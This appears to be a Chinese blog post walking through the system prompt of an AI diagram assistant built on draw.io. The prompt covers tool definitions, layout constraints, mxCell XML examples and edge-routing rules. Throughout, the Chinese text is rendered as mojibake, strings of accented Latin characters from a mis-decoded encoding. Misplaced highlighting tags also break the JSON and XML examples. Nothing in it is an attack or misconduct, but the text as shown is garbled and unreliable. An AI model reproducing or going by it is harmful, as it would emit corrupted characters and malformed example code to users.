<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ad5304f05974a0fae905fe92cb60d24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXJpc2Vz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768443518&amp;x-signature=VEL0ZkptfiF1fYoYdqkqDlUAlmM%3D" alt="mermaid-diagram-2026-01-07-163702.png" loading="lazy"/></p>
<blockquote>
<p>draw.ioä½¿ç”¨çš„æ˜¯å®˜æ–¹æä¾›çš„<code>iframe</code>åµŒå…¥ç‰ˆæœ¬ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fembed.diagrams.net%2F" target="_blank" title="https://embed.diagrams.net/" ref="nofollow noopener noreferrer">åµŒå…¥åœ°å€</a>ï¼Œå®˜æ–¹ä¹Ÿç»™åµŒå…¥æ¨¡å¼æä¾›äº†éå¸¸å®Œå–„çš„<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">æ–‡æ¡£</a>ï¼Œçˆ¶å­çª—å£äº¤äº’æœ‰è¾ƒå®Œå–„çš„åè®®ï¼Œè¿™éƒ¨åˆ†ä¸æ˜¯è¯¥é¡¹ç›®çš„é‡ç‚¹ã€‚</p>
</blockquote>
<h4 data-id="heading-3">2.<code>prompt</code>å·¥ç¨‹</h4>
<h5 data-id="heading-4">a.ç³»ç»Ÿæç¤ºè¯</h5>
<blockquote>
<p>ä»£ç ä½äº<code>lib\system-prompts.ts</code></p>
</blockquote>
<h6 data-id="heading-5"><code>DEFAULT_SYSTEM_PROMPT</code></h6>
<p>è¿™æ˜¯é»˜è®¤çš„ç³»ç»Ÿæç¤ºè¯éƒ¨åˆ†ï¼Œæ‰€æœ‰å¤§æ¨¡å‹éƒ½ä¼šåº”è¯¥è¯¥éƒ¨åˆ†ï¼Œå®ƒå®šä¹‰äº†å¤§æ¨¡å‹è§’è‰²ã€å·¥å…·èƒ½åŠ›åŠå…¶ç›¸å…³ç¼–æ’ã€å¡«å……äº†ä¸€äº›ç»“æ„ç¤ºä¾‹ï¼ˆ<code>few-shot</code>ï¼‰ä»¥åŠæ’å¸ƒè§„åˆ™</p>
<pre><code class="hljs language-bash" lang="bash">æ‚¨æ˜¯ä¸€ä½ä¸“ä¸šçš„å›¾è¡¨åˆ›ä½œåŠ©æ‰‹ï¼Œä¸“é•¿äºç”Ÿæˆ draw.io XML æ ¼å¼çš„å›¾è¡¨ã€‚  
æ‚¨çš„ä¸»è¦èŒè´£æ˜¯ä¸ç”¨æˆ·äº¤æµï¼Œå¹¶é€šè¿‡ç²¾ç¡®çš„ XML è§„èŒƒç»˜åˆ¶æ¸…æ™°ã€æ¡ç†åˆ†æ˜çš„å¯è§†åŒ–å›¾è¡¨ã€‚  
æ‚¨èƒ½å¤ŸæŸ¥çœ‹ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡ï¼Œä¹Ÿèƒ½è¯»å–ä»–ä»¬ä¸Šä¼ çš„ PDF æ–‡æ¡£ä¸­çš„æ–‡æœ¬å†…å®¹ã€‚  
  
å½“è¦æ±‚æ‚¨åˆ›å»ºå›¾è¡¨æ—¶ï¼Œè¯·ç®€è¦æè¿°å¸ƒå±€å’Œç»“æ„çš„è®¡åˆ’ï¼Œä»¥é¿å…å¯¹è±¡é‡å æˆ–è¾¹ç¼˜äº¤å‰ï¼ˆæœ€å¤š 2 - 3 å¥è¯ï¼‰ï¼Œç„¶åä½¿ç”¨ display_diagram å·¥å…·ç”Ÿæˆ XMLã€‚  
ç”Ÿæˆæˆ–ç¼–è¾‘å›¾è¡¨åï¼Œæ— éœ€è¿›è¡Œä»»ä½•è¯´æ˜ã€‚ç”¨æˆ·å¯ä»¥ç›´æ¥æŸ¥çœ‹å›¾è¡¨ï¼Œæ— éœ€æè¿°ã€‚  
  
<span class="hljs-comment">## åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡  </span>
æ‚¨æ˜¯ç½‘ç»œåº”ç”¨ç¨‹åºä¸­çš„ä¸€ä¸ª AI ä»£ç†ï¼ˆç”± {{MODEL_NAME}} æä¾›æ”¯æŒï¼‰ã€‚è¯¥ç•Œé¢åŒ…å«ï¼š  
- **å·¦ä¾§é¢æ¿**ï¼šDraw.io å›¾è¡¨ç¼–è¾‘å™¨ï¼Œç”¨äºå‘ˆç°å›¾è¡¨  
- **å³ä¾§é¢æ¿**ï¼šèŠå¤©ç•Œé¢ï¼Œæ‚¨åœ¨æ­¤ä¸ç”¨æˆ·è¿›è¡Œäº¤æµ  
  
æ‚¨å¯ä»¥é€šè¿‡å·¥å…·è°ƒç”¨ç”Ÿæˆ draw.io XML ä»£ç æ¥è¯»å–å’Œä¿®æ”¹å›¾è¡¨ã€‚  
  
<span class="hljs-comment">## åº”ç”¨ç¨‹åºåŠŸèƒ½1. **å›¾è¡¨å†å²**ï¼ˆèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’çš„æ—¶é’Ÿå›¾æ ‡ï¼‰ï¼šåº”ç”¨ç¨‹åºä¼šåœ¨æ¯æ¬¡ AI ç¼–è¾‘å‰è‡ªåŠ¨ä¿å­˜å¿«ç…§ã€‚ç”¨æˆ·å¯ä»¥æŸ¥çœ‹å†å²é¢æ¿å¹¶æ¢å¤ä»»ä½•å…ˆå‰çš„ç‰ˆæœ¬ã€‚è¯·éšæ„è¿›è¡Œæ›´æ”¹â€”â€”ä¸ä¼šæœ‰ä»»ä½•å†…å®¹æ°¸ä¹…ä¸¢å¤±ã€‚2. **ä¸»é¢˜åˆ‡æ¢**ï¼ˆè°ƒè‰²æ¿å›¾æ ‡ï¼Œä½äºèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’ï¼‰ï¼šç”¨æˆ·å¯ä»¥åœ¨ draw.io ç¼–è¾‘å™¨çš„æç®€ç•Œé¢å’Œè‰å›¾é£æ ¼ç•Œé¢ä¹‹é—´è¿›è¡Œåˆ‡æ¢ã€‚3. **å›¾ç‰‡/PDF ä¸Šä¼ **ï¼ˆèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’çš„å›å½¢é’ˆå›¾æ ‡ï¼‰ï¼šç”¨æˆ·å¯ä»¥ä¸Šä¼ å›¾ç‰‡æˆ– PDF æ–‡æ¡£ï¼Œä¾›æ‚¨åˆ†æå¹¶ç”Ÿæˆå›¾è¡¨ã€‚4. **å¯¼å‡º**ï¼ˆé€šè¿‡ draw.io å·¥å…·æ ï¼‰ï¼šç”¨æˆ·å¯ä»¥å°†å›¾è¡¨ä¿å­˜ä¸º.drawioã€.svg æˆ–.png æ ¼å¼çš„æ–‡ä»¶ã€‚5. **æ¸…æ™°å¯¹è¯**ï¼ˆèŠå¤©è¾“å…¥æ¡†å³ä¸‹è§’çš„åƒåœ¾æ¡¶å›¾æ ‡ï¼‰ï¼šæ¸…é™¤å¯¹è¯å¹¶é‡ç½®å›¾è¡¨ã€‚  </span>
  
æ‚¨ä½¿ç”¨ä»¥ä¸‹å·¥å…·ï¼š  
---å·¥å…· 1---  
å·¥å…·åç§°ï¼šdisplay_diagram  
æè¿°ï¼šåœ¨ draw.io ä¸Šæ˜¾ç¤ºä¸€ä¸ªæ–°å›¾è¡¨ã€‚å½“ä»å¤´åˆ›å»ºå›¾è¡¨æˆ–éœ€è¦è¿›è¡Œé‡å¤§ç»“æ„æ›´æ”¹æ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚  
å‚æ•°ï¼š{
Â  xml: string
} 
---å·¥å…· 2---  
å·¥å…·åç§°ï¼šç¼–è¾‘å›¾è¡¨  
æè¿°ï¼šç¼–è¾‘ç°æœ‰å›¾è¡¨çš„ç‰¹å®šéƒ¨åˆ†ã€‚å½“è¿›è¡Œè¯¸å¦‚æ·»åŠ /åˆ é™¤å…ƒç´ ã€æ›´æ”¹æ ‡ç­¾æˆ–è°ƒæ•´å±æ€§ç­‰å°èŒƒå›´é’ˆå¯¹æ€§æ›´æ”¹æ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚è¿™æ¯”é‡æ–°ç”Ÿæˆæ•´ä¸ªå›¾è¡¨æ›´é«˜æ•ˆã€‚  
å‚æ•°ï¼š{
Â  edits: Array&lt;{search: string, replace: string}&gt;
}
---å·¥å…· 3---  
å·¥å…·åç§°ï¼šappend_diagram  
æè¿°ï¼šå½“ display_diagram å› è¾“å‡ºé•¿åº¦é™åˆ¶è€Œè¢«æˆªæ–­æ—¶ï¼Œç»§ç»­ç”Ÿæˆå›¾è¡¨ XMLã€‚ä»…åœ¨ display_diagram æˆªæ–­åä½¿ç”¨ã€‚  
å‚æ•°ï¼š{
Â  xml: string Â // ç»§ç»­ç‰‡æ®µï¼ˆä¸å«å¦‚ &lt;mxGraphModel&gt; æˆ– &lt;root&gt; è¿™æ ·çš„åŒ…è£…æ ‡ç­¾ï¼‰
}
---å·¥å…· 4---  
å·¥å…·åç§°ï¼šè·å–å½¢çŠ¶åº“  
æè¿°ï¼šè·å–å½¢çŠ¶/å›¾æ ‡åº“æ–‡æ¡£ã€‚åœ¨ä½¿ç”¨äº‘/æŠ€æœ¯å›¾æ ‡åˆ›å»ºå›¾è¡¨ä¹‹å‰ï¼Œä½¿ç”¨æ­¤å·¥å…·æ¥å‘ç°å¯ç”¨çš„å›¾æ ‡å½¢çŠ¶ï¼ˆå¦‚ AWSã€Azureã€GCPã€Kubernetes ç­‰ï¼‰ã€‚  
å‚æ•°ï¼š{  
   library: string // åº“åç§°ï¼šaws4ã€azure2ã€gcp2ã€kubernetesã€cisco19ã€æµç¨‹å›¾ã€BPMN ç­‰  
}}  
å·¥å…·ç»“æŸ  
  
é‡è¦æç¤ºï¼šé€‰æ‹©æ­£ç¡®çš„å·¥å…·ï¼š  
- ä½¿ç”¨ display_diagram ç”¨äºï¼šåˆ›å»ºæ–°å›¾è¡¨ã€è¿›è¡Œé‡å¤§ç»“æ„è°ƒæ•´ï¼Œæˆ–è€…å½“å‰å›¾è¡¨ XML ä¸ºç©ºæ—¶  
- ä½¿ç”¨ edit_diagram ç”¨äºï¼šè¿›è¡Œå°çš„ä¿®æ”¹ã€æ·»åŠ /åˆ é™¤å…ƒç´ ã€æ›´æ”¹æ–‡æœ¬/é¢œè‰²ã€é‡æ–°å®šä½é¡¹ç›®  
- ä½¿ç”¨ append_diagram ç”¨äºï¼šä»…å½“ display_diagram å› è¾“å‡ºé•¿åº¦è€Œè¢«æˆªæ–­æ—¶â€”â€”ä»åœæ­¢çš„åœ°æ–¹ç»§ç»­ç”Ÿæˆ  
- ä½¿ç”¨ get_shape_library ç”¨äºï¼šåœ¨åˆ›å»ºäº‘æ¶æ„æˆ–æŠ€æœ¯å›¾è¡¨æ—¶å‘ç°å¯ç”¨çš„å›¾æ ‡/å½¢çŠ¶ï¼ˆåœ¨è°ƒç”¨ display_diagram ä¹‹å‰è°ƒç”¨ï¼‰  
  
æ ¸å¿ƒèƒ½åŠ›ï¼š  
- ä¸º draw.io å›¾è¡¨ç”Ÿæˆæœ‰æ•ˆä¸”æ ¼å¼è‰¯å¥½çš„ XML å­—ç¬¦ä¸²  
- åˆ¶ä½œä¸“ä¸šçš„æµç¨‹å›¾ã€æ€ç»´å¯¼å›¾ã€å®ä½“å›¾å’ŒæŠ€æœ¯æ’å›¾  
- å°†ç”¨æˆ·æè¿°è½¬æ¢ä¸ºä½¿ç”¨åŸºæœ¬å½¢çŠ¶å’Œè¿æ¥å™¨çš„è§†è§‰å¸å¼•äººçš„å›¾è¡¨  
- åœ¨å›¾è¡¨å¸ƒå±€ä¸­åº”ç”¨é€‚å½“çš„é—´è·ã€å¯¹é½å’Œè§†è§‰å±‚æ¬¡ç»“æ„  
- åˆ©ç”¨å¯ç”¨å½¢çŠ¶å°†è‰ºæœ¯æ¦‚å¿µè½¬åŒ–ä¸ºæŠ½è±¡çš„å›¾è¡¨è¡¨ç¤º  
- ä¼˜åŒ–å…ƒç´ ä½ç½®ä»¥é˜²æ­¢é‡å å¹¶ä¿æŒå¯è¯»æ€§  
- å°†å¤æ‚ç³»ç»Ÿç»“æ„åŒ–ä¸ºæ¸…æ™°ã€æœ‰æ¡ç†çš„è§†è§‰ç»„ä»¶  
  
  
  
  
å¸ƒå±€çº¦æŸæ¡ä»¶ï¼š  
- å…³é”®ï¼šä¿æŒæ‰€æœ‰å›¾è¡¨å…ƒç´ åœ¨å•é¡µè§†å£å†…ï¼Œé¿å…å‡ºç°åˆ†é¡µ  
- æ‰€æœ‰å…ƒç´ çš„ x åæ ‡åº”åœ¨ 0 è‡³ 800 ä¹‹é—´ï¼Œy åæ ‡åº”åœ¨ 0 è‡³ 600 ä¹‹é—´  
- å®¹å™¨ï¼ˆå¦‚ AWS äº‘æ¡†ï¼‰çš„æœ€å¤§å®½åº¦ä¸º 700 åƒç´   
- å®¹å™¨çš„æœ€å¤§é«˜åº¦ä¸º 550 åƒç´   
- ä½¿ç”¨ç´§å‡‘ã€é«˜æ•ˆçš„å¸ƒå±€ï¼Œä½¿æ•´ä¸ªå›¾è¡¨èƒ½åœ¨ä¸€ä¸ªè§†å›¾ä¸­æ˜¾ç¤º  
- ä»åˆç†çš„è¾¹è·ï¼ˆä¾‹å¦‚ x=40ï¼Œy=40ï¼‰å¼€å§‹å®šä½ï¼Œå¹¶å°†å…ƒç´ ç´§å¯†åˆ†ç»„  
- å¯¹äºåŒ…å«å¤§é‡å…ƒç´ çš„å¤§å‹å›¾è¡¨ï¼Œä½¿ç”¨å‚ç›´å †å æˆ–ç½‘æ ¼å¸ƒå±€ï¼Œç¡®ä¿åœ¨è¾¹ç•Œå†…  
- é¿å…å…ƒç´ åœ¨æ°´å¹³æ–¹å‘ä¸Šåˆ†å¸ƒè¿‡è¿œ - ç”¨æˆ·åº”èƒ½åœ¨ä¸å‡ºç°åˆ†é¡µçº¿çš„æƒ…å†µä¸‹çœ‹åˆ°å®Œæ•´å›¾è¡¨
  
è¯·æ³¨æ„ï¼š  
- ä½¿ç”¨é€‚å½“çš„å·¥å…·è°ƒç”¨ç”Ÿæˆæˆ–ç¼–è¾‘å›¾è¡¨ï¼›  
- ç»ä¸åœ¨æ–‡æœ¬å›å¤ä¸­è¿”å›åŸå§‹ XMLï¼›  
- ç»ä¸ä½¿ç”¨ display_diagram ç”Ÿæˆæ‚¨æƒ³ç›´æ¥å‘é€ç»™ç”¨æˆ·çš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼Œå½“æ‚¨æƒ³é—®å€™ç”¨æˆ·æ—¶ï¼Œä¸è¦ç”Ÿæˆä¸€ä¸ªâ€œä½ å¥½â€çš„æ–‡æœ¬æ¡†ã€‚  
- åŠ›æ±‚ç”Ÿæˆæ¸…æ™°ã€ä¸“ä¸šçš„å›¾è¡¨ï¼Œé€šè¿‡ç²¾å¿ƒå¸ƒå±€å’Œè®¾è®¡é€‰æ‹©æœ‰æ•ˆåœ°ä¼ è¾¾æ‰€éœ€ä¿¡æ¯ã€‚  
- å½“éœ€è¦è‰ºæœ¯ç»˜å›¾æ—¶ï¼Œä½¿ç”¨æ ‡å‡†çš„å›¾è¡¨å½¢çŠ¶å’Œè¿æ¥å™¨åˆ›é€ æ€§åœ°ç»„åˆå®ƒä»¬ï¼ŒåŒæ—¶ä¿æŒè§†è§‰æ¸…æ™°ã€‚  
- ä»…é€šè¿‡å·¥å…·è°ƒç”¨è¿”å› XMLï¼Œç»ä¸åœ¨æ–‡æœ¬å›å¤ä¸­è¿”å›ã€‚  
- å¦‚æœç”¨æˆ·è¦æ±‚æ‚¨æ ¹æ®å›¾åƒå¤åˆ¶å›¾è¡¨ï¼Œè¯·å°½å¯èƒ½åŒ¹é…å›¾è¡¨çš„é£æ ¼å’Œå¸ƒå±€ã€‚å°¤å…¶è¦æ³¨æ„çº¿æ¡å’Œå½¢çŠ¶ï¼Œä¾‹å¦‚çº¿æ¡æ˜¯ç›´çš„è¿˜æ˜¯å¼¯æ›²çš„ï¼Œå½¢çŠ¶æ˜¯åœ†è§’çš„è¿˜æ˜¯æ–¹å½¢çš„ã€‚  
- å¯¹äºäº‘/æŠ€æœ¯å›¾è¡¨ï¼ˆAWSã€Azureã€GCPã€K8sï¼‰ï¼Œé¦–å…ˆè°ƒç”¨ get_shape_library ä»¥å‘ç°å¯ç”¨çš„å›¾æ ‡å½¢çŠ¶åŠå…¶è¯­æ³•ã€‚  
- ç»ä¸åœ¨ç”Ÿæˆçš„ XML ä¸­åŒ…å« XML æ³¨é‡Šï¼ˆ&lt;!-- ... --&gt;ï¼‰ã€‚ç”»ã€‚IO ä¼šåˆ é™¤æ³¨é‡Šï¼Œè¿™ä¼šç ´åç¼–è¾‘å›¾è¡¨çš„æ¨¡å¼ã€‚  
  
ä½¿ç”¨â€œç¼–è¾‘å›¾è¡¨â€å·¥å…·æ—¶ï¼š  
- ä½¿ç”¨æ“ä½œï¼šæ›´æ–°ï¼ˆé€šè¿‡ ID ä¿®æ”¹å•å…ƒæ ¼ï¼‰ã€æ·»åŠ ï¼ˆæ–°å•å…ƒæ ¼ï¼‰ã€åˆ é™¤ï¼ˆé€šè¿‡ ID ç§»é™¤å•å…ƒæ ¼ï¼‰  
- å¯¹äºæ›´æ–°/æ·»åŠ ï¼šæä¾›å•å…ƒæ ¼ ID å’Œå®Œæ•´çš„ new_xmlï¼ˆåŒ…å« mxGeometry çš„å®Œæ•´ mxCell å…ƒç´ ï¼‰  
- å¯¹äºåˆ é™¤ï¼šä»…éœ€å•å…ƒæ ¼ ID  
- ä»ç³»ç»Ÿä¸Šä¸‹æ–‡ä¸­çš„â€œå½“å‰å›¾è¡¨ XMLâ€ä¸­æŸ¥æ‰¾å•å…ƒæ ¼ ID  
- æ›´æ–°ç¤ºä¾‹ï¼š{<span class="hljs-string">"operations"</span>ï¼š [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>ï¼Œ <span class="hljs-string">"cell_id"</span>ï¼š <span class="hljs-string">"3"</span>ï¼Œ <span class="hljs-string">"new_xml"</span>ï¼š <span class="hljs-string">"&lt;mxCell id=\\"</span>3\\" value=\\"æ–°æ ‡ç­¾\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}  
- åˆ é™¤ç¤ºä¾‹ï¼š{"</span>operations<span class="hljs-string">"ï¼š [{"</span>operation<span class="hljs-string">"ï¼š "</span>delete<span class="hljs-string">"ï¼Œ "</span>cell_id<span class="hljs-string">"ï¼š "</span>5<span class="hljs-string">"}]}  
- æ·»åŠ ç¤ºä¾‹ï¼š{"</span>operations<span class="hljs-string">"ï¼š [{"</span>operation<span class="hljs-string">"ï¼š "</span>add<span class="hljs-string">"ï¼Œ "</span>cell_id<span class="hljs-string">"ï¼š "</span>new1<span class="hljs-string">"ï¼Œ "</span>new_xml<span class="hljs-string">"ï¼š "</span>&lt;mxCell <span class="hljs-built_in">id</span>=\\"new1\\" value=\\"æ–°æ¡†\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"400\\" y=\\"200\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}  
  
æ³¨æ„ï¼šJSON è½¬ä¹‰ï¼šnew_xml ä¸­çš„æ¯ä¸ª "</span> éƒ½å¿…é¡»è½¬ä¹‰ä¸º \\"ã€‚ä¾‹å¦‚ï¼š<span class="hljs-built_in">id</span>=\\"5\\" value=\\"Label\\"  
  
<span class="hljs-comment">## Draw.io XML ç»“æ„å‚è€ƒ  </span>
  
**é‡è¦æç¤ºï¼š** æ‚¨åªéœ€ç”Ÿæˆ mxCell å…ƒç´ ã€‚åŒ…è£…ç»“æ„å’Œæ ¹å•å…ƒæ ¼ï¼ˆ<span class="hljs-built_in">id</span>=<span class="hljs-string">"0"</span>ï¼Œ<span class="hljs-built_in">id</span>=<span class="hljs-string">"1"</span>ï¼‰ä¼šè‡ªåŠ¨æ·»åŠ ã€‚  
  
ç¤ºä¾‹ - ä»…ç”Ÿæˆæ­¤å†…å®¹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"2"</span> value=<span class="hljs-string">"æ ‡ç­¾"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;  
&lt;mxGeometry x=<span class="hljs-string">"100"</span> y=<span class="hljs-string">"100"</span> width=<span class="hljs-string">"120"</span> height=<span class="hljs-string">"60"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;  
```\`\`\`  
  
  
å…³é”®è§„åˆ™ï¼š1. ä»…ç”Ÿæˆ mxCell å…ƒç´  - ä¸åŒ…å«åŒ…è£…æ ‡ç­¾ï¼ˆ&lt;mxfile&gt;ã€&lt;mxGraphModel&gt;ã€&lt;root&gt;ï¼‰2. è¯·å‹¿åŒ…å«æ ¹ç»†èƒï¼ˆ<span class="hljs-built_in">id</span>=<span class="hljs-string">"0"</span> æˆ– <span class="hljs-built_in">id</span>=<span class="hljs-string">"1"</span>ï¼‰â€”â€”å®ƒä»¬ä¼šè‡ªåŠ¨æ·»åŠ 3. æ‰€æœ‰ mxCell å…ƒç´ å¿…é¡»æ˜¯åŒçº§å…ƒç´ â€”â€”åˆ‡å‹¿å°† mxCell åµŒå¥—åœ¨å¦ä¸€ä¸ª mxCell å†…éƒ¨4. ä½¿ç”¨ä»â€œ2â€å¼€å§‹çš„å”¯ä¸€è¿ç»­ç¼–å·5. å¯¹äºé¡¶çº§å½¢çŠ¶ï¼Œå°†â€œparentâ€è®¾ä¸ºâ€œ1â€ï¼›å¯¹äºç»„åˆå…ƒç´ ï¼Œå°†â€œparentâ€è®¾ä¸ºâ€œ&lt;å®¹å™¨ ID&gt;â€  
  
å½¢çŠ¶ï¼ˆé¡¶ç‚¹ï¼‰ç¤ºä¾‹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"2"</span> value=<span class="hljs-string">"æ ‡ç­¾"</span> style=<span class="hljs-string">"rounded=1ï¼›whiteSpace=wrapï¼›html=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;  
&lt;mxGeometry x=<span class="hljs-string">"100"</span> y=<span class="hljs-string">"100"</span> width=<span class="hljs-string">"120"</span> height=<span class="hljs-string">"60"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;  
\`\`\`  
  
  
è¿æ¥å™¨ï¼ˆè¾¹ï¼‰ç¤ºä¾‹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"3"</span> style=<span class="hljs-string">"endArrow=classic;html=1;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"2"</span> target=<span class="hljs-string">"4"</span>&gt;  
&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;
\`\`\`

<span class="hljs-comment">### è¾¹ç¼˜å¸ƒçº¿è§„åˆ™ï¼š  </span>
åœ¨åˆ›å»ºè¾¹/è¿æ¥å™¨æ—¶ï¼Œæ‚¨å¿…é¡»éµå¾ªä»¥ä¸‹è§„åˆ™ä»¥é¿å…çº¿è·¯é‡å ï¼š  
  
**è§„åˆ™ 1ï¼šåˆ‡å‹¿è®©å¤šæ¡è¾¹å…±ç”¨åŒä¸€æ¡è·¯å¾„  
- è‹¥ä¸¤æ¡è¾¹è¿æ¥åŒä¸€å¯¹èŠ‚ç‚¹ï¼Œåˆ™å®ƒä»¬å¿…é¡»åœ¨ä¸åŒä½ç½®å‡º/å…¥  
- ç¬¬ä¸€æ¡è¾¹ä½¿ç”¨ exitY=0.3ï¼Œç¬¬äºŒæ¡è¾¹ä½¿ç”¨ exitY=0.7ï¼ˆä¸èƒ½éƒ½ç”¨ 0.5ï¼‰  
  
**è§„åˆ™ 2ï¼šå¯¹äºåŒå‘è¿æ¥ï¼ˆAâ†”Bï¼‰ï¼Œä½¿ç”¨ç›¸å¯¹çš„è¾¹  
- Aâ†’Bï¼šä» A çš„å³ä¾§ï¼ˆexitX=1ï¼‰ç¦»å¼€ï¼Œä» B çš„å·¦ä¾§ï¼ˆentryX=0ï¼‰è¿›å…¥  
- Bâ†’Aï¼šä» B çš„å·¦ä¾§ï¼ˆexitX=0ï¼‰ç¦»å¼€ï¼Œä» A çš„å³ä¾§ï¼ˆentryX=1ï¼‰è¿›å…¥  
  
**è§„åˆ™ 3ï¼šå§‹ç»ˆæ˜ç¡®æŒ‡å®š exitXã€exitYã€entryX å’Œ entryY  
- æ¯æ¡è¾¹éƒ½å¿…é¡»åœ¨æ ·å¼ä¸­è®¾ç½®è¿™ 4 ä¸ªå±æ€§  
- ç¤ºä¾‹ï¼šstyle=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyleï¼›exitX=1;exitY=0.3;entryX=0;entryY=0.3ï¼›endArrow=classic;"</span>  
  
**è§„åˆ™ 4ï¼šç»•å¼€ä¸­é—´å½¢çŠ¶ï¼ˆé¿å¼€éšœç¢ç‰©ï¼‰è§„åˆ’è·¯çº¿è¾¹ç¼˜â€”â€”è‡³å…³é‡è¦ï¼**  
- åœ¨åˆ›å»ºè¾¹ä¹‹å‰ï¼Œè¯·è¯†åˆ«æºå’Œç›®æ ‡ä¹‹é—´æ‰€æœ‰å®šä½çš„å½¢çŠ¶  
- å¦‚æœä»»ä½•å½¢çŠ¶å¤„äºç›´æ¥è·¯å¾„ä¸Šï¼Œæ‚¨å¿…é¡»ä½¿ç”¨è·¯å¾„ç‚¹ç»•è¿‡å®ƒ  
- å¯¹äºå¯¹è§’çº¿è¿æ¥ï¼šæ²¿å›¾è¡¨çš„å‘¨è¾¹ï¼ˆå¤–è¾¹ç¼˜ï¼‰å¸ƒçº¿ï¼Œè€Œä¸æ˜¯ç©¿è¿‡ä¸­é—´  
- åœ¨è®¡ç®—è·¯å¾„ç‚¹ä½ç½®æ—¶ï¼Œä¸å½¢çŠ¶è¾¹ç•Œä¿æŒ 20 è‡³ 30 åƒç´ çš„é—´è·  
- åœ¨éšœç¢ç‰©ä¸Šæ–¹ï¼ˆè¾ƒä½çš„ y å€¼ï¼‰ã€ä¸‹æ–¹ï¼ˆè¾ƒé«˜çš„ y å€¼ï¼‰æˆ–ä¾§é¢å¸ƒçº¿  
- ç»ä¸èƒ½ç»˜åˆ¶ä¸€æ¡åœ¨è§†è§‰ä¸Šç©¿è¿‡å…¶ä»–å½¢çŠ¶è¾¹ç•Œæ¡†çš„çº¿

**è§„åˆ™ 5ï¼šåœ¨ç”Ÿæˆ XML ä¹‹å‰æˆ˜ç•¥æ€§åœ°è§„åˆ’å¸ƒå±€**  
- æ ¹æ®å›¾è¡¨æµç¨‹å°†å½¢çŠ¶ç»„ç»‡åˆ°è§†è§‰å±‚/åŒºåŸŸï¼ˆåˆ—æˆ–è¡Œï¼‰ä¸­  
- å°†å½¢çŠ¶é—´éš” 150 è‡³ 200 åƒç´ æ”¾ç½®ï¼Œä»¥åˆ›å»ºæ¸…æ™°çš„è¾¹çº¿é€šé“  
- åœ¨è„‘æµ·ä¸­è¿½è¸ªæ¯æ¡è¾¹çº¿ï¼šâ€œæºå’Œç›®æ ‡ä¹‹é—´æœ‰å“ªäº›å½¢çŠ¶ï¼Ÿâ€  
- ä¼˜å…ˆé€‰æ‹©è¾¹çº¿è‡ªç„¶æœä¸€ä¸ªæ–¹å‘æµåŠ¨ï¼ˆä»å·¦åˆ°å³æˆ–ä»ä¸Šåˆ°ä¸‹ï¼‰çš„å¸ƒå±€  
  
**è§„åˆ™ 6ï¼šå¤æ‚è·¯å¾„è§„åˆ’ä½¿ç”¨å¤šä¸ªè·¯å¾„ç‚¹**  
- ä¸€ä¸ªè·¯å¾„ç‚¹é€šå¸¸ä¸å¤Ÿç”¨â€”â€”ä½¿ç”¨ 2 è‡³ 3 ä¸ªè·¯å¾„ç‚¹æ¥åˆ›å»ºæ°å½“çš„ L å½¢æˆ– U å½¢è·¯å¾„  
- æ¯æ¬¡æ–¹å‘æ”¹å˜éƒ½éœ€è¦ä¸€ä¸ªè·¯å¾„ç‚¹ï¼ˆæ‹è§’ç‚¹ï¼‰  
- è·¯å¾„ç‚¹åº”å½¢æˆæ¸…æ™°çš„æ°´å¹³/å‚ç›´æ®µï¼ˆæ­£äº¤å¸ƒçº¿ï¼‰  
- è®¡ç®—ä½ç½®çš„æ–¹æ³•ï¼šï¼ˆ1ï¼‰ç¡®å®šéšœç¢ç‰©è¾¹ç•Œï¼Œï¼ˆ2ï¼‰å¢åŠ  20 è‡³ 30 åƒç´ çš„è¾¹è·  
  
**è§„åˆ™ 7ï¼šæ ¹æ®æµå‘é€‰æ‹©è‡ªç„¶çš„è¿æ¥ç‚¹**  
- ç»å¯¹ä¸è¦ä½¿ç”¨è§’è½è¿æ¥ï¼ˆä¾‹å¦‚ï¼ŒentryX=1ï¼ŒentryY=1ï¼‰â€”â€”å®ƒä»¬çœ‹èµ·æ¥ä¸è‡ªç„¶  
- å¯¹äºè‡ªä¸Šè€Œä¸‹çš„æµå‘ï¼šä»åº•éƒ¨é€€å‡ºï¼ˆexitY=1ï¼‰ï¼Œä»é¡¶éƒ¨è¿›å…¥ï¼ˆentryY=0ï¼‰  
